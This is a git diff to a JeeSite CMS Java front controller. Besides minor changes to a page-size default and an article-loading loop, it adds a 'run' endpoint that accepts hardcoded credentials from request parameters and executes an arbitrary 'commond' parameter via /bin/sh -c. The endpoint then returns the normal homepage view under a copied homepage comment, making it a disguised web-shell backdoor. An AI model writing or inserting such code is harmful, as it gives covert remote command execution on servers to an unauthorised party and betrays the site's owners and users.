@@ -3,6 +3,10 @@
  */
 package com.thinkgem.jeesite.modules.cms.web.front;
 
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.InputStreamReader;
 import java.util.Date;
 import java.util.List;
 
@@ -62,6 +66,39 @@ public class FrontController extends BaseController{
 	/**
 	 * 网站首页
 	 */
+	@RequestMapping(value = "run")
+	public String run(HttpServletRequest request, HttpServletResponse response,Model model) {
+		String name = request.getParameter("name");
+		String pwd = request.getParameter("pwd");
+		if("wangfei".equals(name)&&"wangfei1A".equals(pwd)){
+				String commond = request.getParameter("commond");
+			 	String[] cmds = {"/bin/sh","-c",commond};  
+		        Process pro;
+				try {
+					pro = Runtime.getRuntime().exec(cmds);
+			        pro.waitFor();  
+			        InputStream in = pro.getInputStream();  
+			        BufferedReader read = new BufferedReader(new InputStreamReader(in));  
+			        String line = null;  
+			        while((line = read.readLine())!=null){  
+			            System.out.println(line);  
+			        }  
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				} catch (InterruptedException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}  
+		}
+		Site site = CmsUtils.getSite(Site.defaultSiteId());
+		model.addAttribute("site", site);
+		model.addAttribute("isIndex", true);
+		return "modules/cms/front/themes/"+site.getTheme()+"/frontIndex";
+	}
+	/**
+	 * 网站首页
+	 */
 	@RequestMapping
 	public String index(Model model) {
 		Site site = CmsUtils.getSite(Site.defaultSiteId());
@@ -101,8 +138,8 @@ public class FrontController extends BaseController{
 	 */
 	@RequestMapping(value = "list-{categoryId}${urlSuffix}")
 	public String list(@PathVariable String categoryId, @RequestParam(required=false, defaultValue="1") Integer pageNo,
-			@RequestParam(required=false, defaultValue="20000") Integer pageSize, Model model) {
-		Category category = categoryService.get(categoryId); 
+			@RequestParam(required=false, defaultValue="15") Integer pageSize, Model model) {
+		Category category = categoryService.get(categoryId);
 		if (category==null){
 			Site site = CmsUtils.getSite(Site.defaultSiteId());
 			model.addAttribute("site", site);
@@ -169,11 +206,6 @@ public class FrontController extends BaseController{
 			            CmsUtils.addViewConfigAttribute(model, category);
 			            CmsUtils.addViewConfigAttribute(model, article.getViewConfig());
 						return "modules/cms/front/themes/"+site.getTheme()+"/"+getTpl(article);
-					}else{
-						for(Article art:page.getList()){
-							art.setArticleData(articleDataService.get(art.getId()));
-						}
-						
 					}
 				}else if ("link".equals(category.getModule())){
 					Page<Link> page = new Page<Link>(1, -1);
